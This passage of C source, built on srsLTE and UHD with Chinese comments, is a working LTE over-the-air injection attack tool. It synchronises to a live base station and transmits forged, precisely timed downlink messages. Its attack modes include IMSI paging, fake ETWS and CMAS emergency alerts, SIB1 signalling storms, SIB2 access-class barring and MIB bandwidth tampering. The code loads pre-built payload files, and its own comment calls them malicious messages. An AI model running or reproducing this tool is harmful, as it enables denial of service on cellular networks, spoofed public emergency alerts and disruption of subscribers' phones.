                    if (ret != sf_n_samples * 1.2)
                    {
                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
                        exit(-1);
                    }
                }
                // 子帧9处理：寻呼信息发送
                if (cur_sf_idx == 9 && !paging_stop)
                {
                    printf("[Subframe %d] Paging Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
                    // 发送output_buffer3中的数据（子帧9的寻呼数据）
                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer3,
                                                     sf_n_samples * 1.2,
                                                     future_time.full_secs, future_time.frac_secs,
                                                     true, start_of_burst, end_of_burst);
                    if (ret != sf_n_samples * 1.2)
                    {
                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
                        exit(-1);
                    }
                }
            }
            else if (attack_mode == 3) // AC_Barring
            {
                // 子帧0处理：SIB12或SIB2发送
                if (cur_sf_idx == 0)
                {
                    printf("[Subframe %d] SIB2 Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
                    // 发送output_buffer4中的数据（子帧0的SIB数据）
                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer4,
                                                     sf_n_samples * 1.2,
                                                     future_time.full_secs, future_time.frac_secs,
                                                     true, start_of_burst, end_of_burst);

                    if (ret != sf_n_samples * 1.2)
                    {
                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
                        exit(-1);
                    }
                }
            }
            else if (attack_mode == 4)
            {
            }
            else if (attack_mode == 5)
            {
            }
            first = false;
        }
        else
        {
            pthread_mutex_unlock(&mutex); // 释放互斥锁
        }
    }
    return NULL;
}
*/

typedef int (*tx_handler_t)(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len);

// IMSI_PAGING (mode 0): 仅在子帧9发送 output_buffer3
int handler_paging_imsi(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    if (paging_stop)
        return 0;
    if (cur_sf_idx == 9)
    {
        *out_buf = output_buffer3[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    return 0;
}

int handler_paging_etws(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    if (paging_stop)
        return 0;
    if (cur_sf_idx == 9)
    {
        *out_buf = output_buffer3[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    return 0;
}

// SIG_STORM (mode 1): 子帧5发送 SIB1 (output_buffer2)，子帧9发送 paging (output_buffer3)
int handler_sig_storm(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    if (paging_stop)
        return 0;
    if (cur_sf_idx == 5)
    {
        *out_buf = output_buffer2[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    else if (cur_sf_idx == 9)
    {
        *out_buf = output_buffer3[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    return 0;
}


// AC_BARRING (mode 2): 子帧0发送 SIB2(output_buffer4)，子帧9发送 paging(output_buffer3)
int handler_ac_barring(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    if (cur_sf_idx == 1)
    // if (cur_sf_idx == 0)
    {
        *out_buf = output_buffer4[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    else if (cur_sf_idx == 9)
    {
        *out_buf = output_buffer3[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    return 0;
}

// MIB-DLBW (mode 2): 子帧0发送 MIB(output_buffer4)，子帧9发送 paging(output_buffer3)
int handler_mib_dlbw(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    if (cur_sf_idx == 0)
    {
        *out_buf = output_buffer4[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    else if (cur_sf_idx == 9)
    {
        *out_buf = output_buffer3[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    return 0;
}

// SCHED_BARRED (mode 3): 子帧5发送 SIB1 (output_buffer2)，子帧9发送 paging (output_buffer3)
int handler_sib_mnc(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    if (paging_stop)
        return 0;
    if (cur_sf_idx == 5)
    {
        *out_buf = output_buffer2[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    else if (cur_sf_idx == 9)
    {
        *out_buf = output_buffer3[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    return 0;
}

// CMAS (mode 4)
int handler_cmas(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    if (cur_sf_idx == 1) // 子帧0的SIB12
    {
        *out_buf = output_buffer4[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    else if (cur_sf_idx == 5) // 子帧5的SIB1
    {
        *out_buf = output_buffer2[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    else if (cur_sf_idx == 9) // 子帧9的Paging
    {
        *out_buf = output_buffer3[0];
        *out_len = (int)(sf_n_samples * 1.2);
        return 1;
    }
    return 0;
}
// 默认 handler（mode 未实现）
int handler_null(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
{
    (void)cur_sf_idx;
    (void)paging_stop;
    *out_buf = NULL;
    *out_len = 0;
    return 0;
}

#define MAX_ATTACK_MODES 8
static tx_handler_t tx_handlers[MAX_ATTACK_MODES] = {
    handler_paging_imsi,  // 0
    handler_sig_storm,    // 1
    handler_ac_barring,   // 2
    handler_sib_mnc,      // 3
    handler_mib_dlbw,     // 4
    handler_cmas,         // 5
    handler_paging_etws,  // 6
    handler_null,         // 7
    handler_null          // 8
};

// 优化后的发射函数
void *tx_thread_func()
{
    unsigned long mask = 8; // 绑定到核心4（和你原来一致）
    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0)
    {
        printf("\033[1;31m[x] CPU 核心绑定失败\033[0m\n");
    }

    srslte_timestamp_t future_time;
    bool start_of_burst = true;
    bool end_of_burst = true;
    bool first = true;
    bool paging_stop = false;
    float time_offset = 0.01 - 0.0001; // 10ms - 0.1ms

    int cur_sf_idx = -1;
    int cur_sfn = -1;
    int cur_rx_ret = -1;
    srslte_timestamp_t cur_time;
    float estimated_cfo = 0.0f, estimated_sfo = 0.0f;

    while (!go_exit)
    {
        pthread_mutex_lock(&mutex);

        while (updated == false && !go_exit)
        {
            pthread_cond_wait(&cond, &mutex);
        }
        if (go_exit)
        {
            pthread_mutex_unlock(&mutex);
            break;
        }

        updated = false;

        // 复制接收线程写入的全局状态（在临界区内复制）
        cur_sf_idx = sf_idx;
        cur_sfn = sfn;
        cur_rx_ret = rx_ret;
        memcpy(&cur_time, &last_stamp, sizeof(srslte_timestamp_t));

        // 首次运行时的频偏估计
        if (cur_rx_ret == 0 && cur_sfn >= 0 && first == true)
        {
            int samp_rate = srslte_sampling_freq_hz(cell.nof_prb);
            estimated_cfo = srslte_ue_sync_get_cfo(&ue_sync);
            estimated_sfo = srslte_ue_sync_get_sfo(&ue_sync);
            first = false;
            printf("[+] Frequency offset estimated..........CFO: %f SFO: %f\n", estimated_cfo, estimated_sfo);
            pthread_mutex_unlock(&mutex);
            continue;
        }

        // 只有在同步成功并且系统帧号大于等于0的时候才开始发送
        if (!(cur_rx_ret == 0 && cur_sfn >= 0))
        {
            pthread_mutex_unlock(&mutex);
            continue;
        }

        // 计算未来发射时间（复制 cur_time 后修改）
        memcpy(&future_time, &cur_time, sizeof(srslte_timestamp_t));
        future_time.frac_secs += time_offset;

        future_time.frac_secs -= (66.0 / 30720000.0); // 设备校准偏移，需根据设备调整

        // 处理秒位进位
        if (future_time.frac_secs >= 1.0)
        {
            future_time.full_secs += (int)future_time.frac_secs;
            future_time.frac_secs -= (int)future_time.frac_secs;
        }

        int next_sfn = (cur_sfn + 1) % 1024;
        cf_t *to_send_buf = NULL;
        int to_send_len = 0;
        int handler_idx = attack_mode;
        if (handler_idx < 0 || handler_idx >= MAX_ATTACK_MODES)
        {
            handler_idx = 0; // 防御性回退
        }
        tx_handler_t handler = tx_handlers[handler_idx];

        // 根据攻击类型读取要发送的数据，如果读取成功就开始发送
        int want_send = handler(cur_sf_idx, paging_stop, &to_send_buf, &to_send_len);

        // 释放互斥锁（handler 只读取全局或外部 buffer 指针，不应持有 mutex 做发送）
        pthread_mutex_unlock(&mutex); // 释放互斥锁

        char *msg_type[10] = {
            // 下标表示注入消息所在的子帧号
            "MIB",    // 0
            "SIB2",   // 1
            "NULL",   // 2
            "NULL",   // 3
            "NULL",   // 4
            "SIB1",   // 5
            "NULL",   // 6
            "NULL",   // 7
            "NULL",   // 8
            "Paging", // 9
        };

        if (want_send)
        {
            printf("[Subframe %d] %s Injected! next_sfn: %d future_time: %.f: %f s\n",
                   cur_sf_idx, msg_type[cur_sf_idx], next_sfn,
                   difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);

            // 发送构造好的恶意的消息
            int ret = srslte_rf_send_timed_multi(&rf, (void **)&to_send_buf,
                                                 to_send_len,
                                                 future_time.full_secs, future_time.frac_secs,
                                                 true, start_of_burst, end_of_burst);

            if (ret != to_send_len)
            {
                printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not expected len (%d vs %d)!!!!!\n\033[0m", ret, to_send_len);
                exit(-1);
            }
        }
        first = false;
        usleep(1);
    }
    return NULL;
}

// 接收线程函数
void *rx_thread_func()
{
    // printf("[RX] RX线程开始执行\n");
    // 绑定线程到第4个CPU核心上，确保时间精度，避免操作系统把线程在不同核心间切换导致时间不准
    unsigned long mask = 8; // 1 2 4 8 (对应核心1,2,3,4)
    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0)
    {
        printf("\033[1;31m[x] CPU 核心绑定失败\033[0m");
    }
    // uhd_set_thread_priority(0.4, false);
    int n;
    int ret;
    int sfn_offset;
    uint8_t bch_payload[SRSLTE_BCH_PAYLOAD_LEN];
    bool acks[SRSLTE_MAX_CODEWORDS] = {false};
    srslte_cell_t cell;
    srslte_timestamp_t previous_time;
    while (!go_exit)
    {
        pthread_mutex_lock(&mutex);
        ret = srslte_ue_sync_zerocopy_multi(&ue_sync, sf_buffer_sync); // 实现UE与基站的子帧级时间同步
        if (ret == 1)
        {
            rx_ret = 0;
            srslte_ue_sync_get_last_timestamp(&ue_sync, &last_stamp);
            sf_idx = srslte_ue_sync_get_sfidx(&ue_sync);
            printf("\033[1;32m[Subframe %d] UE与基站的子帧同步成功(zerocopy_multi success)\n\033[0m", sf_idx);
            if (srslte_ue_sync_get_sfidx(&ue_sync) == 0) // 如果当前是子帧0，就尝试解码MIB
            {
                n = srslte_ue_mib_decode(&ue_mib, bch_payload, NULL, &sfn_offset);
                if (n < 0)
                {
                    printf("\033[1;33m[-] PBCH 解码过程出错\n\033[0m");
                    // printf("\033[1;33m[-] Error decoding UE MIB\n\033[0m");
                    exit(-1);
                }
                else if (n == 0)
                {
                    sfn = -100;
                    // fprintf(stderr, "MIB DECODING FAILED\n");
                    printf("\033[1;33m[-] PBCH 中未找到 MIB, 需要更多数据\n\033[0m");
                    // printf("\033[1;33m[-] MIB DECODING FAILED\n\033[0m");
                }
                else if (n == SRSLTE_UE_MIB_FOUND)
                {
                    printf("[Subframe 0] MIB Decoded Success\n");
                    srslte_pbch_mib_unpack(bch_payload, &cell, &sfn);
                    // srslte_cell_fprint(stdout, &cell, sfn);
                    // printf("Decoded MIB. SFN: %d, offset: %d\n", sfn, sfn_offset);
                    sfn = (sfn + sfn_offset) % 1024;
                }
            }
            updated = true;
            pthread_cond_signal(&cond);
            // fprintf(stderr,"[Rx] ret: %d, sfn: %d, sf_idx: %d, time: %.f: %f s\n",rx_ret,sfn,sf_idx,difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);
            // fprintf(stderr,"[Rx] rx_ret: %d\n",rx_ret);
            // fprintf(stderr,"[Rx] sf_idx: %d\n",sf_idx);
            // fprintf(stderr,"[Rx] time: %.f: %f s\n",difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);

            // if (srslte_ue_sync_get_sfidx(&ue_sync) != 0 && srslte_ue_sync_get_sfidx(&ue_sync) != 5) {
            if (srslte_ue_sync_get_sfidx(&ue_sync) == 5 && (sfn % 2) == 0)
            {
                n = srslte_ue_dl_decode(&ue_dl, data, 0, sfn * 10 + srslte_ue_sync_get_sfidx(&ue_sync), acks);
                // TODO: 在 MIMO 情况下，srslte_ue_dl_decode 的逻辑不同。必须参考 pdsch_ue 的实现

                // if (n > 0) {
                //   if (n != 904) {
                //     printf("TB is not 904!!!\n");
                //   }
                //   //printf("Format: %s\n", srslte_dci_format_string(ue_dl.dci_format));
                //   //srslte_ra_dl_grant_fprint(stdout, &ue_dl.pdsch_cfg.grant);
                // }
                // else {
                //   printf("n < 0\n");
                // }
            }
            pthread_mutex_unlock(&mutex);
            usleep(1);
            // if (srslte_ue_sync_get_sfidx(&ue_sync) == 0) {
            //   printf("[+] CFO: %+5.12f Hz, SFO: %+3.6f Hz, SFN: %d\n",
            //       srslte_ue_sync_get_cfo(&ue_sync), srslte_ue_sync_get_sfo(&ue_sync), sfn);
            // }
            // if (srslte_ue_sync_get_sfidx(&ue_sync) == 5) {
            //   printf("[+] CFO: %+5.12f Hz, SFO: %+3.6f Hz\n",
            //       srslte_ue_sync_get_cfo(&ue_sync), srslte_ue_sync_get_sfo(&ue_sync));
            // }
        }
        else
        {
            sf_idx = srslte_ue_sync_get_sfidx(&ue_sync);
            printf("\033[1;33m[Subframe %d] UE与基站的子帧同步失败(zerocopy_multi failed)\n\033[0m", sf_idx);
            rx_ret = -1;
            sfn = -100;
            // fprintf(stderr, "zerocopy_multi failed\n");
            updated = true;
            pthread_cond_signal(&cond);
            pthread_mutex_unlock(&mutex);
        }
        // previous_time.full_secs = last_stamp.full_secs;
        // previous_time.frac_secs = last_stamp.frac_secs;

        // if (last_stamp.frac_secs - previous_time.frac_secs != 0.001) {
        //   printf("[Now] %5.17f\n",last_stamp.frac_secs*1e6);
        //   printf("[Bef] %5.17f\n", previous_time.frac_secs*1e6);
        //   printf("[Sub] %5.17f\n", (last_stamp.frac_secs - previous_time.frac_secs)*1e6);
        // }

        // printf("[2][get_last_time] %.f: %f us\n",difftime(last_stamp.full_secs, (time_t) 0),(last_stamp.frac_secs*1e6));
        // printf("[2][current_time] %.f: %f s\n",difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);
    }
    return NULL;
}

int main(int argc, char **argv) // 主函数
{
    // printf("\033[1;32m[+] 开始执行主函数 \033[0m\n");

    // 变量声明和初始化
    int i;
    int decimate = 1;                                               // 降采样因子
    float cfo = 0;                                                  // 载波频率偏移
    int nf = 0, N_id_2 = 0;                                         // 帧号和PSS序列号
    cf_t pss_signal[SRSLTE_PSS_LEN];                                // PSS信号缓冲区
    float sss_signal0[SRSLTE_SSS_LEN];                              // 子帧0的SSS信号
    float sss_signal5[SRSLTE_SSS_LEN];                              // 子帧5的SSS信号
    uint8_t bch_payload[SRSLTE_BCH_PAYLOAD_LEN];                    // BCH传输块
    cf_t *sf_symbols[SRSLTE_MAX_PORTS];                             // 子帧符号
    cf_t *slot1_symbols[SRSLTE_MAX_PORTS];                          // 时隙1符号
    srslte_dci_msg_t dci_msg;                                       // DCI消息
    srslte_dci_location_t locations[SRSLTE_NSUBFRAMES_X_FRAME][30]; // DCI位置
    srslte_refsignal_t csr_refs;                                    // 小区特定参考信号
    srslte_refsignal_t mbsfn_refs;                                  // MBSFN参考信号

    srslte_debug_handle_crash(argc, argv); // 遇到报错，上报给 crash_handler 便于定位

    if (argc < 3) // 参数检查，若参数过少则弹出帮助页面
    {
        usage(argv[0]);
        exit(-1);
    }

    parse_args(argc, argv); // 解析命令行参数

    N_id_2 = cell.id % 3; // 计算PSS序列号（N_id_2 = 小区ID mod 3）

    // 计算子帧的资源元素数和采样点数
    sf_n_re = 2 * SRSLTE_CP_NORM_NSYMB * cell.nof_prb * SRSLTE_NRE;
    sf_n_samples = 2 * SRSLTE_SLOT_LEN(srslte_symbol_sz(cell.nof_prb));

    // 设置PHICH参数
    cell.phich_length = SRSLTE_PHICH_NORM;
    cell.phich_resources = SRSLTE_PHICH_R_1;
    sfn = 0; // 系统帧号初始化为0

    // 计算PRB集合数量
    prbset_num = (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb));
    last_prbset_num = prbset_num;

    // 基础初始化（必须在设置slot_len_*之后调用）
    base_init();

    // 生成PSS/SSS同步信号
    srslte_pss_generate(pss_signal, N_id_2);
    srslte_sss_generate(sss_signal0, sss_signal5, cell.id);

    // 生成参考信号
    if (srslte_refsignal_cs_init(&csr_refs, cell.nof_prb))
    {
        fprintf(stderr, "Error initializing equalizer\n");
        exit(-1);
    }

    // 如果配置了MBSFN区域ID，初始化MBSFN参考信号
    if (mbsfn_area_id > -1)
    {
        if (srslte_refsignal_mbsfn_init(&mbsfn_refs, cell, mbsfn_area_id))
        {
            fprintf(stderr, "Error initializing equalizer\n");
            exit(-1);
        }
    }

    // 设置小区参考信号
    if (srslte_refsignal_cs_set_cell(&csr_refs, cell))
    {
        fprintf(stderr, "Error setting cell\n");
        exit(-1);
    }

    // 初始化符号缓冲区指针
    for (i = 0; i < SRSLTE_MAX_PORTS; i++)
    {
        sf_symbols[i] = sf_buffer[i % cell.nof_ports];
        slot1_symbols[i] = &sf_buffer[i % cell.nof_ports][SRSLTE_SLOT_LEN_RE(cell.nof_prb, cell.cp)];
    }

    // 设置信号处理（用于Ctrl+C退出）
    sigset_t sigset;
    sigemptyset(&sigset);
    sigaddset(&sigset, SIGINT);
    sigprocmask(SIG_UNBLOCK, &sigset, NULL);
    signal(SIGINT, sig_int_handler);

    // 设置采样率
    int srate = srslte_sampling_freq_hz(cell.nof_prb);
    if (srate != -1)
    {
        if (srate < 10e6)
        {
            srslte_rf_set_master_clock_rate(&rf, 4 * srate);
        }
        else
        {
            srslte_rf_set_master_clock_rate(&rf, srate);
        }
        printf("[+] Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
        float srate_rf = srslte_rf_set_tx_srate(&rf, (double)srate);
        if (srate_rf != srate)
        {
            fprintf(stderr, "Could not set sampling rate\n");
            exit(-1);
        }
    }
    else
    {
        fprintf(stderr, "Invalid number of PRB %d\n", cell.nof_prb);
        exit(-1);
    }

    // 设置RF参数
    printf("[+] Set TX gain(发送增益): %.1f dB\n", srslte_rf_set_tx_gain(&rf, rf_gain));
    // printf("[+] Get TX gain(): %.1f dB\n", srslte_rf_get_tx_gain(&rf));
    printf("[+] Set TX freq(发送频率): %.2f MHz\n", srslte_rf_set_tx_freq(&rf, rf_freq) / 1000000);

    // 设置接收参数（用于同步）
    printf("[+] Set RX gain(接收增益): %.1f dB\n", srslte_rf_set_rx_gain(&rf, 25));
    printf("[+] Set RX freq(接收频率): %.2f MHz\n", srslte_rf_set_rx_freq(&rf, rf_freq) / 1000000);
    bool locked = srslte_rf_rx_wait_lo_locked(&rf);
    printf("[1] LO(本地振荡器)是否已经锁定: %s\n", locked ? "locked" : "Not locked"); // 锁定后接收信号频率稳定

    // 搜索并解码MIB（主信息块）来检测小区
    uint32_t ntrial = 0;
    int ret = 0;
    do
    {
        ret = rf_search_and_decode_mib(&rf, 1, &cell_detect_config, -1, &cell, &cfo);
        if (ret < 0)
        {
            fprintf(stderr, "Error searching for cell\n");
            exit(-1);
        }
        else if (ret == 0 && !go_exit)
        {
            printf("[-] Cell not found after %d trials. Trying again (Press Ctrl+C to exit)\n", ntrial++);
        }
    } while (ret == 0 && !go_exit);

    if (go_exit)
    {
        srslte_rf_close(&rf);
        exit(0);
    }

    printf("\033[1;32m[+] 停止RF接收并清空缓存, 开始同步...\n\033[0m");
    // 停止接收流并清空缓冲区
    srslte_rf_stop_rx_stream(&rf);
    srslte_rf_flush_buffer(&rf);

    // 设置接收采样率
    printf("[+] Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
    float srate_rf2 = srslte_rf_set_rx_srate(&rf, (double)srate);
    if (srate_rf2 != srate)
    {
        fprintf(stderr, "Could not set sampling rate\n");
        exit(-1);
    }

    // 初始化UE同步模块
    if (srslte_ue_sync_init_multi_decim(&ue_sync,
                                        cell.nof_prb,
                                        cell.id == 1000,
                                        srslte_rf_recv_wrapper,
                                        1, // 接收天线数
                                        (void *)&rf, decimate))
    {
        fprintf(stderr, "Error initiating ue_sync\n");
        exit(-1);
    }
    if (srslte_ue_sync_set_cell(&ue_sync, cell))
    {
        fprintf(stderr, "Error initiating ue_sync\n");
        exit(-1);
    }

    // UHD设备特定的时间同步设置
    rf_uhd_handler_t *handler = (rf_uhd_handler_t *)rf.handler;
    uhd_usrp_set_time_unknown_pps(handler->usrp, 0, 0.0); // 设置PPS时间
    usleep(1000000);

    // 设置频率调谐参数
    uhd_tune_request_t tune_request = {
        .target_freq = rf_freq,
        .rf_freq_policy = UHD_TUNE_REQUEST_POLICY_AUTO,
        .dsp_freq_policy = UHD_TUNE_REQUEST_POLICY_AUTO,
    };
    uhd_tune_result_t tune_result;

    // 获取 USRP 硬件的当前时间
    time_t full_secs;
    double frac_secs;
    uhd_usrp_get_time_now(handler->usrp, 0, &full_secs, &frac_secs);
    printf("[+] current_time %.f: %f us\n", difftime(full_secs, (time_t)0), (frac_secs * 1e6));

    // 设置精确的时间同步
    uhd_usrp_set_command_time(handler->usrp, full_secs + 1, frac_secs, 0);
    uhd_usrp_set_rx_freq(handler->usrp, &tune_request, 0, &tune_result);
    uhd_usrp_set_tx_freq(handler->usrp, &tune_request, 0, &tune_result);
    uhd_usrp_clear_command_time(handler->usrp, 0);
    usleep(1000000);

    // 检查锁相环状态
    locked = srslte_rf_rx_wait_lo_locked(&rf);
    printf("[2] LO(本地振荡器)是否已经锁定: %s\n", locked ? "locked" : "Not locked"); // 锁定后接收信号频率稳定

    // 验证频率设置
    double tx_freq, rx_freq;
    uhd_usrp_get_tx_freq(handler->usrp, 0, &tx_freq);
    uhd_usrp_get_rx_freq(handler->usrp, 0, &rx_freq);
    if (tx_freq != rf_freq)
    {
        printf("[Tx freq_diff] %f\n", (tx_freq - rf_freq));
    }
    if (rx_freq != rf_freq)
    {
        printf("[Rx freq_diff] %f\n", (rx_freq - rf_freq));
    }

    // 设置同步参数
    ue_sync.cfo_current_value = cfo / 15000;
    ue_sync.cfo_is_copied = true;
    ue_sync.cfo_correct_enable_find = true;
    ue_sync.cfo_correct_enable_track = true;
    srslte_sync_set_cfo_cp_enable(&ue_sync.sfind, false, 0);

    // 分配同步缓冲区
    for (int i = 0; i < 1; i++)
    { // 单天线
        sf_buffer_sync[i] = srslte_vec_malloc(3 * sizeof(cf_t) * SRSLTE_SF_LEN_PRB(100));
        if (!sf_buffer_sync[i])
        {
            perror("malloc");
            exit(-1);
        }
    }

    // 选择攻击类型
    if (attack_mode == PAGING_IMSI) // 0
    {
        read_file(output_buffer3[0], "Paging_IMSI"); // 子帧9的寻呼数据
    }
    else if (attack_mode == SIB1_SIG_STORM) // 1
    {
        read_file(output_buffer2[0], "SIB1_SIG_STORM"); // 子帧5的TAU SIB1
        read_file(output_buffer3[0], "Paging_MODI");    // 子帧9的系统修改寻呼
    }
    else if (attack_mode == SIB2_AC_BARRING) // 2
    {
        read_file(output_buffer4[0], "SIB2_AcBarring"); // 子帧0的接入限制SIB2
        read_file(output_buffer3[0], "Paging_MODI");     // 子帧9的寻呼
    }
    else if (attack_mode == SIB1_MNC) // 3
    {
        read_file(output_buffer2[0], "SIB1_MNC"); // 子帧5的SIB1
        // read_file(output_buffer2[0], "SIB1_CellBarred"); // 子帧5的SIB1
        // read_file(output_buffer2[0], "SIB1_CsgInd"); // 子帧5的SIB1
        // read_file(output_buffer2[0], "SIB1_TEST"); // 子帧5的SIB1
        read_file(output_buffer3[0], "Paging_MODI");  // 子帧9的系统修改寻呼
        // read_file(output_buffer3[0], "PAGING_ETWS");       // 子帧9的寻呼数据
    }else if (attack_mode == MIB_DLBW) // 4
    {
        read_file(output_buffer4[0], "MIB_DLBW"); // 子帧0的接入限制SIB2
        read_file(output_buffer3[0], "Paging_MODI");     // 子帧9的寻呼
    }
    else if (attack_mode == SIB1_CMAS) // 5
    {
        read_file(output_buffer2[0], "SIB1_CMAS");   // 子帧5的SIB1
        read_file(output_buffer3[0], "Paging_MODI"); // 子帧9的寻呼
        // read_file(output_buffer4[0], "SIB2_AC_BARRING"); // 子帧0的接入限制SIB2
        read_file(output_buffer4[0], "SIB12_CMAS"); // 子帧10的SIB12
    }
    else if (attack_mode == PAGING_ETWS) // 6
    {
        read_file(output_buffer3[0], "PAGING_ETWS"); // 子帧9的寻呼数据
    }
    else
    {
        printf("Un-supported Case!\n");
    }

    // 初始化UE MIB解码器
    if (srslte_ue_mib_init(&ue_mib, sf_buffer_sync, cell.nof_prb))
    {
        fprintf(stderr, "Error initaiting UE MIB decoder\n");
        exit(-1);
    }
    if (srslte_ue_mib_set_cell(&ue_mib, cell))
    {
        fprintf(stderr, "Error initaiting UE MIB decoder\n");
        exit(-1);
    }

    // 初始化UE下行处理模块
    if (srslte_ue_dl_init(&ue_dl, sf_buffer_sync, cell.nof_prb, 1))
    {
        fprintf(stderr, "Error initiating UE downlink processing module\n");
        exit(-1);
    }
    if (srslte_ue_dl_set_cell(&ue_dl, cell))
    {
        fprintf(stderr, "Error initiating UE downlink processing module\n");
        exit(-1);
    }

    // 配置信道估计参数
    srslte_chest_dl_cfo_estimate_enable(&ue_dl.chest, false, 1023);
    srslte_chest_dl_average_subframe(&ue_dl.chest, false);
    srslte_ue_dl_set_rnti(&ue_dl, UE_CRNTI); // 设置C-RNTI

    // 重置PBCH解码器
    srslte_pbch_decode_reset(&ue_mib.pbch);

    // 启动接收流
    srslte_rf_start_rx_stream(&rf, false);

    // **** 创建并启动 发送TX 和 接收RX 的线程 ****
    if (pthread_create(&tx_thread, NULL, tx_thread_func, NULL))
    {
        printf("\033[1;31m[x] 发送线程启动失败\n\033[0m");
        exit(-1);
    }
    else
    {
        printf("\033[1;32m[+] 发送线程启动成功\n\033[0m");
    }

    if (pthread_create(&rx_thread, NULL, rx_thread_func, NULL))
    {
        printf("\033[1;31m[x] 接收线程启动失败\n\033[0m");
        exit(-1);
    }
    else
    {
        printf("\033[1;32m[+] 接收线程启动成功\n\033[0m");
    }

    int status;
    int tx_status, rx_status;

    // 等待线程结束，并获取其返回值
    pthread_join(tx_thread, (void **)&tx_status);
    pthread_join(rx_thread, (void **)&rx_status);
    if (tx_status != 0)
    {
        printf("TX线程异常退出\n");
    }
    if (rx_status != 0)
    {
        printf("RX线程异常退出\n");
    }
    printf("\033[1;32m[+] 线程已结束\n\033[0m");

    // 清理资源
    status = pthread_mutex_destroy(&mutex);
    if (status != 0)
    {
        printf("\033[1;31m[+] 销毁互斥锁失败，错误码: %d\n\033[0m", status);
    }
    else
    {
        printf("\033[1;32m[+] 互斥锁销毁成功\n\033[0m");
    }

    srslte_ue_sync_free(&ue_sync);
    srslte_rf_close(&rf);
    printf("\033[1;32m[+] 程序终止成功\n\033[0m");
    exit(0);
}